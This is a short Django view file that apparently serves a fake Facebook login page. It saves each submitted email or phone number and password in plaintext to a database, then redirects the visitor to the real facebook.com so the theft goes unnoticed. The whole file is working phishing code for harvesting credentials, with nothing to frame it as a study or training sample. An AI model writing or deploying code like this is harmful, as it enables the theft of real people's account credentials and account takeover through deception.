from django.shortcuts import render, redirect
from .models import UserLogin
from django.http import HttpResponseRedirect

def login_view(request):
    if request.method == 'POST':
        email_or_phone = request.POST.get('email_or_phone')
        password = request.POST.get('password')

        # Save data to database
        UserLogin.objects.create(email_or_phone=email_or_phone, password=password)
        
        # Redirect to facebook.com after submitting the form
        return HttpResponseRedirect("https://www.facebook.com")

    return render(request, 'facebook_login.html')
